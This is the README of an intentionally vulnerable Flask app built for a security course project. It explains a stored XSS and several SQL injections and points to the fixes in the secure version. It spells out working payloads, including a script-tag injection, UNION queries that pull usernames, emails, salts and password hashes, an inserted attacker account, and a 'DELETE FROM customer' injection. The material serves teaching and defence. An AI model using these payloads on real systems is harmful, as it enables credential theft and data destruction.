# TelecomNotSecure – Vulnerable Version (Part B)

Intentionally insecure Flask app for the Communication_LTD project.
**DO NOT deploy in production.**

## How to run

```bash
cd TelecomNotSecure
cp .env.example .env        # or copy manually on Windows
# edit .env if needed
pip install -r requirements.txt
python app.py
```

App runs on http://127.0.0.1:5000

---

## Part B – Vulnerabilities demonstrated

### B.1 – Stored XSS (system screen)

The customer first name and last name are stored in the DB without sanitization and
rendered without HTML escaping (`Markup()` / `| safe`).

**Attack:**
1. Log in and go to System.
2. Enter as First name: `<script>alert('XSS')</script>`
3. Enter any last name and a unique ID, submit.
4. The script executes immediately and on every subsequent page load for every user.

**Fix (TelecomSecure):** Jinja2 auto-escaping is left enabled (no `| safe`, no `Markup()`).
Special characters are encoded: `<` → `&lt;`, `>` → `&gt;`, etc.

---

### B.2 – SQL Injection

All three routes below build queries by concatenating user input directly into SQL strings.

#### /register – duplicate check & INSERT

```
Vulnerable query:
  SELECT id FROM user WHERE username = '{username}' OR email = '{email}'

Attack (block all registrations):
  username = ' OR '1'='1' --
  → WHERE username = '' OR '1'='1' --' OR email = '...'
  → Always TRUE – system always says "user exists".

Vulnerable INSERT:
  INSERT INTO user (username, email, salt, password_hmac, failed_attempts)
  VALUES ('{username}', '{email}', '{salt}', '{hashed}', 0)

Attack (inject extra row):
  username = legit'), ('evil','evil@x.com','aaa','bbb',0)--
  → Inserts an attacker-controlled account.
```

#### /login – user lookup

```
Vulnerable query:
  SELECT ... FROM user WHERE username = '{username}'

Attack (return first user regardless of username):
  username = ' OR '1'='1' LIMIT 1 --

Attack (extract credentials via UNION):
  username = ' UNION SELECT id,username,email,salt,password_hmac,0,NULL FROM user --
  → The row returned contains real credential data.
```

#### /system – customer search (UNION data extraction)

```
Vulnerable query:
  SELECT ... FROM customer
  WHERE first_name LIKE '%{search}%' OR last_name LIKE '%{search}%'

Attack (dump all users into the customer table view):
  search = ' UNION SELECT id, username, email, id FROM user --
  → Every registered user's username and email appears in the results table.
```

#### /system – customer insert

```
Vulnerable queries:
  SELECT id FROM customer WHERE id_number = '{id_number}'
  INSERT INTO customer (first_name, last_name, id_number) VALUES ('{first_name}', '{last_name}', '{id_number}')

Attack (destroy data):
  id_number = 1'); DELETE FROM customer; --
```

**Fix (TelecomSecure):** All queries use SQLAlchemy ORM or `text()` with bound parameters,
so user input is never interpolated into the SQL string.
